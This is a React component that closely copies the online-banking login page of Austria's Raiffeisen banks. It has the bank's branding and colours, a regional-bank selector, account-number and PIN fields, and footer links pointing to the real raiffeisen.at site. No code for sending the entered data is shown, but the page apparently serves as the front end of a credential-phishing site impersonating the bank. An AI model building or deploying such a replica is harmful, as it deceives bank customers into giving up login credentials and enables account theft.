import { useState, useRef, useEffect } from "react";
import { ExternalLink } from "lucide-react";
import bgImage from "@/assets/rbg_wald.jpg";

const bundeslaender = [
  "Burgenland",
  "Kärnten",
  "Niederösterreich/Wien",
  "Oberösterreich",
  "Salzburg",
  "Steiermark",
  "Tirol",
  "Vorarlberg",
  "Oberösterreich/Bank Direkt",
  "Oberösterreich/PRIVAT BANK",
  "Tirol/Jungholz",
  "Alpen Privatbank",
];

const Raiffeisenbank = () => {
  const [bundesland, setBundesland] = useState("");
  const [verfueger, setVerfueger] = useState("");
  const [pin, setPin] = useState("");
  const [selectOpen, setSelectOpen] = useState(false);
  const dropdownRef = useRef<HTMLDivElement>(null);

  const selectHasValue = bundesland !== "";
  const selectLabelFloated = selectOpen || selectHasValue;

  useEffect(() => {
    const handleClickOutside = (e: MouseEvent) => {
      if (dropdownRef.current && !dropdownRef.current.contains(e.target as Node)) {
        setSelectOpen(false);
      }
    };
    document.addEventListener("mousedown", handleClickOutside);
    return () => document.removeEventListener("mousedown", handleClickOutside);
  }, []);

  return (
    <div
      className="relative flex min-h-screen flex-col items-center justify-center"
      style={{
        fontFamily: "'Open Sans', sans-serif",
        backgroundImage: `url(${bgImage})`,
        backgroundSize: "cover",
        backgroundPosition: "center",
        backgroundAttachment: "fixed",
      }}
    >
      {/* Login Card */}
      <div className="relative z-10 w-full max-w-xl rounded-md bg-white p-8 shadow-lg">
        <h1 className="mb-4 text-2xl font-light text-[#1a1a1a]">
          Bitte melden Sie sich an
        </h1>
        <p className="mb-6 text-sm text-gray-500">
          Wählen Sie Ihr Bundesland und geben Sie Verfügernummer und PIN ein.
        </p>

        {/* Bundesland Custom Dropdown */}
        <div className="relative mb-4" ref={dropdownRef}>
          <label
            className={`pointer-events-none absolute left-3 z-10 transition-all duration-200 ${
              selectLabelFloated
                ? "top-1 text-xs text-gray-500"
                : "top-3 text-sm text-gray-500"
            }`}
          >
            Bundesland oder Bank wählen <span className="text-gray-400">*</span>
          </label>
          <div
            onClick={() => setSelectOpen(!selectOpen)}
            className={`w-full cursor-pointer border-b-2 px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none ${
              selectOpen ? "border-[#fbf315] bg-[#e8e8e8]" : "border-gray-300 bg-[#f4f4f4]"
            }`}
          >
            {bundesland || "\u00A0"}
          </div>
          <div className="pointer-events-none absolute right-3 top-4">
            <svg
              className={`h-5 w-5 text-gray-500 transition-transform duration-200 ${selectOpen ? "rotate-180" : ""}`}
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
            </svg>
          </div>
          {selectOpen && (
            <div
              className="custom-scrollbar absolute left-0 right-0 top-full z-20 border border-gray-200 bg-white shadow-lg"
              style={{
                maxHeight: "160px",
                overflowY: "auto",
              }}
            >
              <div
                onClick={() => { setBundesland(""); setSelectOpen(false); }}
                className="cursor-pointer px-3 py-2 text-sm text-gray-400 hover:bg-gray-100"
              >
                &nbsp;
              </div>
              {bundeslaender.map((bl) => (
                <div
                  key={bl}
                  onClick={() => { setBundesland(bl); setSelectOpen(false); }}
                  className={`cursor-pointer px-3 py-2 text-sm hover:bg-gray-100 ${
                    bundesland === bl ? "bg-gray-100 font-semibold" : ""
                  }`}
                >
                  {bl}
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Verfügernummer */}
        <div className="relative mb-4">
          <input
            type="text"
            value={verfueger}
            onChange={(e) => setVerfueger(e.target.value)}
            placeholder=" "
            className="peer w-full border-b-2 border-gray-300 bg-[#f4f4f4] px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8]"
          />
          <label className="pointer-events-none absolute left-3 top-3 text-sm text-gray-500 transition-all duration-200 peer-focus:top-1 peer-focus:text-xs peer-[&:not(:placeholder-shown)]:top-1 peer-[&:not(:placeholder-shown)]:text-xs">
            Verfügernummer eingeben <span className="text-gray-400">*</span>
          </label>
        </div>

        {/* PIN */}
        <div className="relative mb-6">
          <input
            type="password"
            maxLength={5}
            value={pin}
            onChange={(e) => setPin(e.target.value)}
            placeholder=" "
            className="peer w-full border-b-2 border-gray-300 bg-[#f4f4f4] px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8]"
          />
          <label className="pointer-events-none absolute left-3 top-3 text-sm text-gray-500 transition-all duration-200 peer-focus:top-1 peer-focus:text-xs peer-[&:not(:placeholder-shown)]:top-1 peer-[&:not(:placeholder-shown)]:text-xs">
            PIN eingeben <span className="text-gray-400">*</span>
          </label>
        </div>

        {/* Weiter Button */}
        <div className="flex justify-center">
          <button
            type="button"
            className="rounded-md bg-[#fbf315] px-20 py-3 text-sm font-semibold text-[#1a1a1a] transition-colors hover:bg-[#e6dc12] disabled:opacity-50"
            disabled={!bundesland || !verfueger || !pin}
          >
            Weiter
          </button>
        </div>
      </div>

      {/* Footer */}
      <footer className="fixed bottom-0 left-0 right-0 z-10 py-4">
        <div className="flex flex-wrap items-center justify-center gap-4 text-xs text-white/90">
          <a href="https://raiffeisen.at/de/online-banking/login/impressum.html" target="_blank" rel="noopener noreferrer" className="hover:underline inline-flex items-center gap-1">Impressum <ExternalLink className="h-3 w-3" /></a>
          <a href="https://raiffeisen.at/de/online-banking/login/nutzungsbedingungen.html" target="_blank" rel="noopener noreferrer" className="hover:underline inline-flex items-center gap-1">Nutzungsbedingungen <ExternalLink className="h-3 w-3" /></a>
          <a href="https://raiffeisen.at/de/meine-bank/kundenservice/barrierefreiheit/barrierefreiheitserklaerung.html" target="_blank" rel="noopener noreferrer" className="hover:underline inline-flex items-center gap-1">Barrierefreiheitserklärung <ExternalLink className="h-3 w-3" /></a>
          <span>© 2026 Raiffeisen</span>
        </div>
      </footer>
    </div>
  );
};

export default Raiffeisenbank;
